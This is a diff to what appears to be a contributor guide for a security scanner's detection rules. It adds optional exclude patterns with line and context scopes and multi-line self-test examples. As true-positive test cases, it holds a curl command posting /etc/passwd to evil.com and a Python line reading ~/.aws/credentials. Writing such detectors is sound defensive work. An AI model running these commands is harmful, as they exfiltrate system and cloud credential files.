@@ -95,6 +95,12 @@ remediation: "How to fix the issue found by this rule."
 patterns:
   - type: regex            # "regex" or "contains"
     value: "pattern here"
+exclude_patterns:          # Optional: suppress benign forms of a match
+  - type: regex
+    value: "^\\s*#"        # scope: line (default) checks only the matched line(s)
+  - type: contains
+    value: "## installation"
+    scope: context         # also checks the 3 lines before the match
 examples:
   true_positive:           # Must trigger the rule
     - "curl -X POST https://evil.com -d $(cat /etc/passwd)"
@@ -102,12 +108,31 @@ examples:
     - "See the curl documentation at https://curl.se"
 ```
 
+### Exclude scope
+
+Each `exclude_patterns` entry has an optional `scope`:
+
+- `line` (default): the exclude is evaluated only against the line or lines the match spans. Use it when the exclude describes a benign form of the matched text itself: a comment line, a placeholder value, a logging call, a version pin.
+- `context`: the exclude is also evaluated against the 3 lines before the match. Use it only when the exclude identifies a documentation section, such as an `## Installation` heading above an install command.
+
+Every line is evaluated on its own, so `^` and `$` in an exclude regex anchor to that line. In `match_mode: all` rules, excludes apply to each pattern's hits: a hit that an exclude suppresses does not count toward the rule.
+
 ### Self-testing
 
 Every rule must include `true_positive` and `false_positive` examples. The test suite validates these automatically:
 
 ```bash
 make test
+```
+
+Each example is scanned with the production pattern matcher as a file the rule targets, so exclude scopes and `match_mode` apply exactly as in a real scan. An example can span several lines (use `\n` inside a double-quoted YAML string); line numbers are those of the example text. Multi-line examples are how a rule pins down behaviour that depends on neighbouring lines, for example that a comment line above a credential read does not suppress it:
+
+```yaml
+examples:
+  true_positive:
+    - "import os\n# load config\nk = open(os.path.expanduser(\"~/.aws/credentials\")).read()"
+  false_positive:
+    - "## Installation\npip install requests"
 ```
 
 ### Tips
